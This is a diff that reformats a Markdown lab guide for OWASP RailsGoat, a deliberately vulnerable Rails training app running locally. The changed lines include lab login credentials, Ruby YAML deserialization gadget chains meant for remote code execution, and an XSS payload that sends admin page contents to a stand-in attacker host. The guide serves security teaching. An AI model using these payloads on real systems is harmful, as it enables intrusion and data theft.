@@ -4,7 +4,7 @@
 
 **OWASP RailsGoat** is a deliberately vulnerable Ruby on Rails 4/5/6 web application designed to demonstrate the OWASP Top 10 security vulnerabilities specifically in Rails architectures. Created and maintained by security engineers Ken Johnson and the OWASP Foundation, RailsGoat bridges the gap between general web vulnerabilities and Rails-specific idioms, defaults, conventions, and anti-patterns.
 
-Unlike generic challenge targets, RailsGoat is built to emulate a realistic enterprise Human Resources / Employee Portal (named *Goat Hills Financial*), containing employee directories, benefit plans, payroll documents, and administrative tools.
+Unlike generic challenge targets, RailsGoat is built to emulate a realistic enterprise Human Resources / Employee Portal (named _Goat Hills Financial_), containing employee directories, benefit plans, payroll documents, and administrative tools.
 
 - **Target URL**: [http://localhost:8109](http://localhost:8109)
 - **Container Name**: `cyberlab_web_railsgoat`
@@ -16,11 +16,11 @@ Unlike generic challenge targets, RailsGoat is built to emulate a realistic ente
 
 ## Pre-Seeded Lab Credentials
 
-| Role | Username / Email | Password |
-|---|---|---|
-| **Administrator** | `admin@railsgoat.dev` | `railsgoat!` |
-| **Standard User** | `user@railsgoat.dev` | `railsgoat!` |
-| **Alternative User** | `norm@railsgoat.dev` | `railsgoat!` |
+| Role                 | Username / Email      | Password     |
+| -------------------- | --------------------- | ------------ |
+| **Administrator**    | `admin@railsgoat.dev` | `railsgoat!` |
+| **Standard User**    | `user@railsgoat.dev`  | `railsgoat!` |
+| **Alternative User** | `norm@railsgoat.dev`  | `railsgoat!` |
 
 ---
 
@@ -128,25 +128,26 @@ Ruby developers often use YAML or Marshal to store session tokens, user preferen
 2. **Crafting YAML RCE Payload**:
    A classic Rails YAML deserialization gadget uses `ActionDispatch::Routing::RouteSet::NamedRouteCollection`:
    ```yaml
-   --- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
-   'foo': !ruby/object:OpenStruct
+   ---
+   !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
+   "foo": !ruby/object:OpenStruct
      table:
        :defaults: {}
    ```
    Or Universal Ruby Deserialization Gadgets (via `Gem::Requirement` and `Gem::DependencyList`):
    ```yaml
-   --- !ruby/object:Gem::Requirement
-   requirements:
-     !ruby/object:Gem::DependencyList
+   ---
+   !ruby/object:Gem::Requirement
+   requirements: !ruby/object:Gem::DependencyList
      specs:
-     - !ruby/object:Gem::Source::SpecificFile
-       spec: !ruby/object:Gem::Package::TarReader
-         io: !ruby/object:Net::BufferedIO
-           io: !ruby/object:Gem::Package::DigestIO
-             digester: !ruby/object:Gem::Security::Policy
-               permissions:
-               - !ruby/object:Gem::Security::Policy
-                 opt: id
+       - !ruby/object:Gem::Source::SpecificFile
+         spec: !ruby/object:Gem::Package::TarReader
+           io: !ruby/object:Net::BufferedIO
+             io: !ruby/object:Gem::Package::DigestIO
+               digester: !ruby/object:Gem::Security::Policy
+                 permissions:
+                   - !ruby/object:Gem::Security::Policy
+                     opt: id
    ```
 3. Submit the YAML payload to the document/profile import endpoint to verify code execution.
 
@@ -165,7 +166,10 @@ Rails ERB templates automatically HTML-escape variables rendered with `<%= ... %
 2. Navigate to **Work Performance -> Reviews** or **Messages**.
 3. Submit an XSS payload containing an SVG or event listener:
    ```html
-   <img src=x onerror="fetch('/admin/users').then(r=>r.text()).then(d=>new Image().src='http://attacker.com/?stolen='+encodeURIComponent(d))">
+   <img
+     src="x"
+     onerror="fetch('/admin/users').then(r=>r.text()).then(d=>new Image().src='http://attacker.com/?stolen='+encodeURIComponent(d))"
+   />
    ```
 4. Verify execution when viewing the comment or profile page.
 
@@ -217,7 +221,9 @@ All videos verified active via YouTube oEmbed API (`HTTP 200 OK`):
 ---
 
 ## Quick CLI Control
+
 From the `cyber_lab` root directory:
+
 ```bash
 # Start RailsGoat
 ./lab start railsgoat
